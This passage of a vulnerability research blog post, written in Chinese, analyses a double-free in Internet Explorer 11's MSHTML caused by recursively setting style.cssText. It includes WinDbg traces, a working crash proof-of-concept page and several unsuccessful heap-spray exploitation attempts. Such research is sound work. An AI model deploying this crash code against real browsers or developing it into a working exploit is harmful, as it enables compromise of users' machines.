+03cb5060  04091400 6be39140 00000002 0000000f
+03cb5070  0409140a 6be39140 00000001 0000000f
+03cb5080  04090300 6be25b4c 00000001 6ce7d8e4
+03cb5090  04090300 6be25c58 00000002 03020c04
+03cb50a0  808c1f0a 8001140b 04d5cc68 00000006
+03cb50b0  808c1f0a 8001140b 04d5cd10 6ce7d988
+03cb50c0  84081f0a 8001140b 04d5cca0 04d5ccca	//第9个和第10个元素指向同一个字符串
+03cb50d0  84081f0a 8001140b 04d5cca0 04d5ccca
+0:007&gt; du 04d5cc68 
+04d5cc68  "none fixed 49cp auto"
+0:007&gt; du 04d5cd10 
+04d5cd10  "none fixed 49cp auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+</code></pre></div></div>
+
+<p>经过四次put_cssText后，Style中含有两个指向相同cssText的元素，在后续执行<code class="language-plaintext highlighter-rouge">location.reload();</code>时，会清理当前文档的所有元素，此时<code class="language-plaintext highlighter-rouge">CAttrArray::Free</code>准备释放的就是elm对象:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; g
+Breakpoint 1 hit
+eax=0020fd78 ebx=02f355b0 ecx=02f1db70 edx=00f22e01 esi=02f1db70 edi=02f355c0
+eip=6d1d4cb8 esp=035dc0ec ebp=035dc0fc iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+MSHTML!CAttrArray::Free:
+6d1d4cb8 8bff            mov     edi,edi
+0:008&gt; dps poi(esp+4) L10						//当前释放的AttrArray就是elm
+02f37b80  6d2e1e34 MSHTML!CPhraseElement::`vftable'
+02f37b84  00008000
+02f37b88  00000000
+02f37b8c  00000011
+02f37b90  02f1db70
+02f37b94  00000000
+02f37b98  00000000
+02f37b9c  00000000
+02f37ba0  0000003f
+02f37ba4  02000400
+02f37ba8  80020e00
+02f37bac  00020044
+02f37bb0  02f328a0
+02f37bb4  00000000
+02f37bb8  00000000
+02f37bbc  00000000
+0:008&gt; dd 02f1db70 L4
+02f1db70  00000018 00000005 02f35560 0041faf0	//AttrArray
+0:008&gt; dd 02f35560 L5*4							
+02f35560  80001f00 800103e9 04274ab0 035db400	//className = 'AAAAAAAAA'
+02f35570  80000d09 800103e9 02f35620 02f35620	//Attribute:class
+02f35580  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
+02f35590  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; du 04274ab0 
+04274ab0  "AAAAAAAAA"
+0:008&gt; du poi(02f35620+24)
+0426a13c  "class"
+0:008&gt; du poi(02f355c0+24)
+0426a19c  "style"
+0:008&gt; dd 05b223e0 L4
+05b223e0  00000034 0000000a 02f7bd40 00e04748
+0:008&gt; dd 02f7bd40 La*4
+02f7bd40  04091400 6d2a9068 00000002 0000000f
+02f7bd50  0409140a 6d2a9068 00000001 0000000f
+02f7bd60  04091400 6d2a9140 00000002 0000000f
+02f7bd70  0409140a 6d2a9140 00000001 0000000f
+02f7bd80  04090300 6d295b4c 00000001 6e2ed8e4
+02f7bd90  04090300 6d295c58 00000002 00ef0c04
+02f7bda0  808c1f0a 8001140b 04284340 00000006
+02f7bdb0  808c1f0a 8001140b 04284458 6e2ed988
+02f7bdc0  84081f0a 8001140b 042843e8 04284412	//重复的字符串
+02f7bdd0  84081f0a 8001140b 042843e8 04284412
+</code></pre></div></div>
+
+<p>随后<code class="language-plaintext highlighter-rouge">CAttrArray::Free</code>内部会执行memmove移动AttrArray，并执行<code class="language-plaintext highlighter-rouge">ProcessHeapFree</code>释放各个结构：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
+eax=02f35570 ebx=02f1db70 ecx=02f35560 edx=00f22e01 esi=02f35570 edi=035dc0e8
+eip=6d7fcc91 esp=035dc0bc ebp=035dc0e8 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+MSHTML!CAttrArray::Free+0x84:
+6d7fcc91 ff15d4b1406e    call    dword ptr [MSHTML!_imp__memmove (6e40b1d4)] ds:002b:6e40b1d4={msvcrt!memmove (75a49e5a)}
+0:008&gt; dd 02f35560 L5*4
+02f35560  80001f00 800103e9 04274ab0 035db400	//className = 'AAAAAAAAA'
+02f35570  80000d09 800103e9 02f35620 02f35620	//Attribute:class
+02f35580  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
+02f35590  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; pc
+eax=0000001f ebx=02f1db70 ecx=04274ab0 edx=00000000 esi=02f35570 edi=035dc0e8
+eip=6d221ae4 esp=035dc0c8 ebp=035dc0e8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CAttrArray::Free+0xfd:
+6d221ae4 e8ddb4f8ff      call    MSHTML!ProcessHeapFree (6d1acfc6)
+0:008&gt; dd 02f35560 L5*4
+02f35560  80000d09 800103e9 02f35620 02f35620	//Attribute:class
+02f35570  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
+02f35580  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
+02f35590  80001a04 800113f3 02f377c0 02f37800
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; dps poi(esp) La							//要释放Attribute:style
+02f355c0  6d1877a4 MSHTML!CAttribute::`vftable'
+02f355c4  00000001
+02f355c8  00000000
+02f355cc  00000008
+02f355d0  00000000
+02f355d4  00000000
+02f355d8  00000000
+02f355dc  00000000
+02f355e0  ffffffff
+02f355e4  0426a19c
+</code></pre></div></div>
+
+<p>当外层的elm都释放完毕后，开始释放内部的elm.style.cssText：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
+eax=00000000 ebx=02f1db70 ecx=05b223e0 edx=00000000 esi=05b223e0 edi=035dc0e8
+eip=6d221aff esp=035dc0b0 ebp=035dc0bc iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::`scalar deleting destructor'+0xc:
+6d221aff e8b431fbff      call    MSHTML!CAttrArray::Free (6d1d4cb8)
+0:008&gt; dd 02f35560 L5*4								//此时外部的elm全部被释放
+02f35560  80001a04 800113f3 02f377c0 02f37800
+02f35570  80001a04 800113f3 02f377c0 02f37800
+02f35580  80001a04 800113f3 02f377c0 02f37800
+02f35590  80001a04 800113f3 02f377c0 02f37800
+02f355a0  80001a04 800113f3 02f377c0 02f37800
+0:008&gt; dd 05b223e0 L4								//还未被释放的elm.style.cssText
+05b223e0  00000034 00000009 02f7bd40 00000008		
+0:008&gt; dd 02f7bd40 La*4
+02f7bd40  04091400 6d2a9068 00000002 0000000f
+02f7bd50  0409140a 6d2a9068 00000001 0000000f
+02f7bd60  04091400 6d2a9140 00000002 0000000f
+02f7bd70  0409140a 6d2a9140 00000001 0000000f
+02f7bd80  04090300 6d295b4c 00000001 6e2ed8e4
+02f7bd90  04090300 6d295c58 00000002 00ef0c04
+02f7bda0  808c1f0a 8001140b 04284340 00000006
+02f7bdb0  808c1f0a 8001140b 04284458 6e2ed988
+02f7bdc0  84081f0a 8001140b 042843e8 04284412
+02f7bdd0  84081f0a 8001140b 042843e8 04284412
+0:008&gt; 
+eax=0000001f ebx=05b223e0 ecx=04284340 edx=00000000 esi=02f7bd50 edi=035dc0a8
+eip=6d221ae4 esp=035dc088 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CAttrArray::Free+0xfd:
+6d221ae4 e8ddb4f8ff      call    MSHTML!ProcessHeapFree (6d1acfc6)
+0:008&gt; dd 02f7bd40 La*4								//执行许多memmove后，开始释放cssText内部的字符串
+02f7bd40  808c1f0a 8001140b 04284458 6e2ed988
+02f7bd50  84081f0a 8001140b 042843e8 04284412
+02f7bd60  84081f0a 8001140b 042843e8 04284412
+02f7bd70  84081f0a 8001140b 042843e8 04284412
+02f7bd80  84081f0a 8001140b 042843e8 04284412
+02f7bd90  84081f0a 8001140b 042843e8 04284412
+02f7bda0  84081f0a 8001140b 042843e8 04284412
+02f7bdb0  84081f0a 8001140b 042843e8 04284412
+02f7bdc0  84081f0a 8001140b 042843e8 04284412
+02f7bdd0  84081f0a 8001140b 042843e8 04284412
+</code></pre></div></div>
+
+<p>此时可以清晰的看到，由于之前cssText中存在两个指向相同字符串的元素，因此在释放时会将同一个字符串释放两次，触发了漏洞：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; t
+eax=0000001f ebx=05b223e0 ecx=04284340 edx=00000000 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfc6 esp=035dc084 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree:
+6d1acfc6 8bff            mov     edi,edi
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=04284340 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du poi(esp)								//准备释放第一个cssText
+04284340  "none fixed 49cp auto"
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=04284458 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du 04284340								//第一个cssText被释放
+04284340  "Æone fixed 49cp auto"
+0:008&gt; du poi(esp) 								//准备释放第二个cssText
+04284458  "none fixed 49cp auto"
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=042843e8 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du 04284458								//第二个cssText被释放
+04284458  ".one fixed 49cp auto"				
+0:008&gt; du poi(esp)								//准备释放第三个cssText
+042843e8  "char strict auto auto"
+0:008&gt; pc
+eax=0000001f ebx=05b223e0 ecx=003f0000 edx=042843e8 esi=02f7bd50 edi=035dc0a8
+eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!ProcessHeapFree+0xb:
+6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
+0:008&gt; du 042843e8								//此时第三个cssText已经被释放
+042843e8  ".溜"
+0:008&gt; du poi(esp)								//但是继续释放同一个内存，此时继续则会触发双重释放
+042843e8  ".溜"
+</code></pre></div></div>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<h2 id="简化poc">简化POC</h2>
+
+<p>经过最终简化后的POC为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+function testcase() {
+elm = document.createElement('ins')
+func = function(e) {
+    this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+}
+elm.addEventListener('DOMAttrModified', func, true)
+elm.className = 'AAAAAAAAA'
+
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>然而该POC的利用难度更大，虽然不用reload即可造成崩溃，但是调试后发现崩溃原因是因为每次设置cssText后都会触发EventListener使得继续设置cssText，嵌套调用多次后导致释放原来的cssText出错，造成了内存损坏：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; r
+eax=00000000 ebx=00000000 ecx=77342c0e edx=03944201 esi=00380000 edi=07d408f8
+eip=7739e975 esp=03944454 ebp=039444cc iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+ntdll!RtlReportCriticalFailure+0x29:
+7739e975 cc              int     3
+0:007&gt; kb
+ # ChildEBP RetAddr  Args to Child              
+00 039444cc 7739f8a9 c0000374 773d4270 03944510 ntdll!RtlReportCriticalFailure+0x29
+01 039444dc 7739f989 00000002 7d9ede58 00000000 ntdll!RtlpReportHeapFailure+0x21
+02 03944510 7734d95c 00000008 00380000 07d408f8 ntdll!RtlpLogHeapFailure+0xa1
+03 03944540 764914ad 00380000 00000000 07d40900 ntdll!RtlFreeHeap+0x64
+04 03944554 6da925cc 00380000 00000000 07d40900 kernel32!HeapFree+0x14
+05 03944570 6d1acfd6 07d40900 6d221ae9 00000000 MSHTML!MemoryProtection::HeapFree+0x46
+06 03944578 6d221ae9 00000000 800113eb 1f9d2224 MSHTML!ProcessHeapFree+0x10
+07 039445a0 6d425d0a 033e7680 00000000 033e7a40 MSHTML!CAttrArray::Free+0x102
+08 03944714 6d607f06 6d2a4e1c 1f9d2224 07d5855c MSHTML!PROPERTYDESC::HandleStyleComponentProperty+0x8ac
+09 03944778 6d607df1 07d5855c 033e7a40 039447c4 MSHTML!BASICPROPPARAMS::SetStyleComponentProperty+0xfe
+0a 039447a4 6d607d82 6d2a4e1c 039447c4 000d2200 MSHTML!CBase::put_StyleComponentHelper+0x3a
+0b 039447c8 6d8d2aac 033e7a40 07d5855c 6d2a4e1c MSHTML!CCSSStyleDeclaration::put_StyleComponentLocalHelper+0x7a
+0c 039447e8 6d8d2a76 033e7a40 07d5855c 03944890 MSHTML!CWritableCSSStyleDeclaration::put_cssText+0x28
+0d 03944810 706d302a 041f7b10 02000002 041eaa80 MSHTML!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7f
+0e 03944880 706d3a73 041f7b10 02000002 041eaa80 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19d
+0f 039448a8 70840b88 d6d1a38e 03944b60 041dd360 jscript9!&lt;lambda_73b9149c3f1de98aaab9368b6ff2ae9d&gt;::operator()+0xa1
+10 03944920 02d90125 034d3028 041eaa80 000003b7 jscript9!Js::JavascriptOperators::PatchPutValueNoLocalFastPath&lt;Js::InlineCache&gt;+0x352
+</code></pre></div></div>
+
+<p>内存释放的动作不可控，无法在释放内存前添加对象占用内存，因此仍使用原POC进行利用。</p>
+
+<h2 id="利用尝试">利用尝试</h2>
+
+<h3 id="尝试一手动释放csstext">尝试一：手动释放cssText</h3>
+
+<p>在查看CVE-2020-17053时，可以通过Worker对象释放ArrayBuffer，随后通过新建数组对象填充被释放的内存实现UAF：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var ab = new ArrayBuffer(0x8c);
+var obj = {};
+obj.valueOf = function () {
+    if (flag == 1) {
+		//alert("free");
+        worker = new Worker('worker.js');
+        worker.postMessage(ab, [ab]);
+        worker.terminate();
+        worker = null;
+        var start = Date.now();
+        while (Date.now() - start &lt; 200) {}
+        for(var i=0;i&lt;0x1000;++i)
+		{
+			R1[i] = new Array((0x1000-0x20)/4);
+			for(var j=0;j&lt;R1[i].length;++j)
+			{
+				R1[i][j] = 0x666;   //flag
+			}
+		}
+		// TODO: reclaim freed memory
+		return 0;
+    }
+</code></pre></div></div>
+
+<p>于是打算在利用Worker对象释放cssText随后占用，修改EXP如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+var iterationCount = 0;
+	
+function testcase() {
+Math.atan2(1,0);
+elm = document.createElement('ins')
+func = function(e) {
+        iterationCount++;
+        switch (iterationCount) {
+                case 1:
+                case 2:
+                case 12:
+                case 22:
+                /*case 34:*/
+                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+                        break;
+        }
+}
+elm.addEventListener('DOMAttrModified', func, true)
+elm.className = 'AAAAAAAAA'
+
+elm.removeEventListener('DOMAttrModified', func, true);
+worker = new Worker('worker.js');
+worker.postMessage(elm.style.cssText);
+worker.terminate();
+var arr = new ArrayBuffer(0x22);
+
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>然而在调试时发现<code class="language-plaintext highlighter-rouge">worker.terminate();</code>执行后，cssText字符串并没有被释放，也就无法占用内存利用：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; g
+Breakpoint 0 hit
+eax=00000002 ebx=04de1a50 ecx=6a854520 edx=040ab4d0 esi=00000002 edi=040ab540
+eip=6e1b3027 esp=040ab4c8 ebp=040ab530 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab518={MSHTML!CFastDOM::CWorker::Trampoline_postMessage (6a854520)}
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000001 ebx=04de1a80 ecx=6b07b4c0 edx=040ab4d8 esi=00000001 edi=040ab548
+eip=6e1b3027 esp=040ab4d0 ebp=040ab538 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab520={MSHTML!CFastDOM::CWorker::Trampoline_terminate (6b07b4c0)}
+0:007&gt; dd 03adb930 La*4
+03adb930  04091400 6a3b9068 00000002 0000000f
+03adb940  0409140a 6a3b9068 00000001 0000000f
+03adb950  04091400 6a3b9140 00000002 0000000f
+03adb960  0409140a 6a3b9140 00000001 0000000f
+03adb970  04090300 6a3a5b4c 00000001 6b3fd8e4
+03adb980  04090300 6a3a5c58 00000002 03080c04
+03adb990  808c1f0a 8001140b 043cc748 00000006
+03adb9a0  808c1f0a 8001140b 043cc7f0 6b3fd988
+03adb9b0  84081f0a 8001140b 043cc780 043cc7aa
+03adb9c0  84081f0a 8001140b 043cc780 043cc7aa
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000002 ebx=04db3360 ecx=6b062d40 edx=040ab4d0 esi=00000002 edi=040ab540
+eip=6e1b3027 esp=040ab4c8 ebp=040ab530 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab518={MSHTML!CFastDOM::CWindow::Trampoline_alert (6b062d40)}
+0:007&gt; dd 03adb930 La*4
+03adb930  04091400 6a3b9068 00000002 0000000f
+03adb940  0409140a 6a3b9068 00000001 0000000f
+03adb950  04091400 6a3b9140 00000002 0000000f
+03adb960  0409140a 6a3b9140 00000001 0000000f
+03adb970  04090300 6a3a5b4c 00000001 6b3fd8e4
+03adb980  04090300 6a3a5c58 00000002 03080c04
+03adb990  808c1f0a 8001140b 043cc748 00000006
+03adb9a0  808c1f0a 8001140b 043cc7f0 6b3fd988
+03adb9b0  84081f0a 8001140b 043cc780 043cc7aa
+03adb9c0  84081f0a 8001140b 043cc780 043cc7aa
+0:007&gt; du 043cc780 
+043cc780  "char strict auto auto"
+0:007&gt; du 043cc748 
+043cc748  "none fixed 49cp auto"
+</code></pre></div></div>
+
+<h3 id="尝试二设置csstext清空内存">尝试二：设置cssText清空内存</h3>
+
+<p>在分析漏洞原理时得知，每次设置新的cssText内容时，会先清除原本的字符串后再赋值新的字符串，因此利用该特性清除原本的字符串时应该也会产生崩溃。于是修改POC执行<code class="language-plaintext highlighter-rouge">elm.style.cssText = '';</code>，结果验证猜想，确实会产生崩溃：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; g
+Breakpoint 0 hit
+eax=00000004 ebx=0343a600 ecx=6a7145f0 edx=036ab500 esi=00000004 edi=036ab578
+eip=6e1b3027 esp=036ab4f8 ebp=036ab568 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab550={MSHTML!CFastDOM::CNode::Trampoline_removeEventListener (6a7145f0)}
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000001 ebx=03436990 ecx=6a3df860 edx=036ab308 esi=00000001 edi=036ab374
+eip=6e1b3027 esp=036ab300 ebp=036ab364 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab34c={MSHTML!CFastDOM::CHTMLElement::Trampoline_Get_style (6a3df860)}
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000002 ebx=03448b10 ecx=6a535d30 edx=036ab3f8 esi=00000002 edi=036ab46c
+eip=6e1b3027 esp=036ab3f0 ebp=036ab45c iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab444={MSHTML!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText (6a535d30)}
+0:007&gt; g						//重新设置cssText后由于释放了原本的cssText造成了doublefree
+Critical error detected c0000374
+(a4c.32c): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=00000000 ecx=77342c0e edx=036aadd9 esi=005f0000 edi=036b8768
+eip=7739e975 esp=036ab02c ebp=036ab0a4 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+ntdll!RtlReportCriticalFailure+0x29:
+7739e975 cc              int     3
+</code></pre></div></div>
+
+<p>接着打算利用addEventListener添加新的监听，使得在清除cssText时能够执行回调函数创建ArrayBuffer占用被释放的内存：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+var iterationCount = 0;
+var R1 = new Array();	
+function testcase() {
+Math.atan2(1,0);
+elm = document.createElement('ins')
+func = function(e) {
+        iterationCount++;
+        switch (iterationCount) {
+                case 1:
+                case 2:
+                case 12:
+                case 22:
+                /*case 34:*/
+                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+                        break;
+        }
+}
+funcA = function(a) {
+        for(var i=0;i&lt;0x100;++i)
+		{
+			R1[i] = new ArrayBuffer(0x2c);
+		}
+
+}
+elm.addEventListener('DOMAttrModified', func, true)
+elm.className = 'AAAAAAAAA'
+elm.addEventListener('DOMAttrModified', funcA, true)
+elm.style.cssText = '';				//执行该语句会清空cssText，导致崩溃
+var view = new DataView(R1[0]);
+alert(view.byteLength);
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>然而调试后发现回调触发是在清空cssText之后，因此无法通过该种方式填充被释放的内存。</p>
+
+<h3 id="尝试三利用worker新建线程进行占位">尝试三：利用worker新建线程进行占位</h3>
+
+<p>在查阅worker新建线程时查看到<a href="https://exploiting.files.wordpress.com/2012/10/html5-heap-spray.pdf">html5-heap-spray</a>这篇文章，可以通过worker新建线程进行堆喷，这样在清除cssText时就有机会通过新线程创建的对象占位被释放的cssText实现UAF：</p>
+
+<p>修改后的poc.html：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+var iterationCount = 0;
+function testcase() {
+elm = document.createElement('ins')
+func = function(e) {
+        iterationCount++;
+        switch (iterationCount) {
+                case 1:
+                case 2:
+                case 12:
+                case 22:
+                /*case 34:*/
+                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+                        break;
+        }
+}
+
+elm.addEventListener('DOMAttrModified', func, true);
+alert(1);
+elm.className = 'AAAAAAAAA';
+elm.removeEventListener('DOMAttrModified', func, true);
+var workers = new Worker('worker.js');
+var arr = new Arraybuffer(0x2c);
+workers.postMessage(arr);
+var arrview = new DataView(arr);
+elm.style.cssText = '';
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>worker.js:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onmessage = function(e){
+	var a = Array();
+	for(var i = 0; i&lt;0x100; i++){
+		a[i] = new ArrayBuffer(0x2c);
+	}
+	postMessage(e);
+}
+</code></pre></div></div>
+
+<p>但是在调试过程中，执行到新建线程后程序便无法断下了，猜测没有创建正确的worker.js导致无法继续利用，利用尝试失败。</p>
+
+<p>于是验证IE11是否能正确使用web worker对象，编写的web worker代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test.html:
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;title&gt;Web Worker&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;p&gt;Web Worker is Counting Numbers&lt;/p&gt;
+
+	&lt;p&gt;Counting: &lt;output id="countM"&gt;&lt;/output&gt;&lt;/p&gt;
+
+	&lt;button onclick="alertMessage()"&gt;
+		Alert On
+	&lt;/button&gt;
+
+	&lt;script&gt;
+	
+		// This is function to run alert
+		function alertMessage() {
+			alert("Web Worker is Running in Background");
+		}
+
+		// Created a web worker and passed script which
+		// needs to execute in background
+		var worker = new Worker("worker.js");
+
+		// Called onmessage method to get value from
+		// script file and show it on web page
+		worker.onmessage = function (event) {
+			document.getElementById("countM")
+				.innerHTML = event.data;
+		};
+	&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+//------------------------------------------------------------
+
+worker.js:
+// Initialized a variable with 0
+var count = 0;
+
+function timedCount() {
+count = count + 1;
+	
+// It is used to send value
+// back to html page
+postMessage(count);
+	
+// It is a timeout function
+setTimeout("timedCount()",1000);
+}
+
+timedCount();
+</code></pre></div></div>
+
+<p>使用同样的代码在Chrome和Edge中均能正常执行：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220630113303316.png" alt="image-20220630113303316" /></p>
+
+<p>然而在IE11中，web worker却无法正常执行，Counting没有正确显示：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220630113426845.png" alt="image-20220630113426845" /></p>
+
+<p>可能由于IE11对于web worker的支持并不是很多，导致该种利用方式无法成功执行。</p>
+
+<h1 id="总结">总结</h1>
+
+<p>漏洞是因为cssText被递归设置导致内部字符串损坏，出现了两个指向同一个字符串的cssText，当再次重置cssText时，由于同一个字符串被释放两次造成了漏洞。利用思路可以通过新建线程在释放cssText时创建对象占用被释放的字符串内存，实现从doublefree到UAF。</p>
+
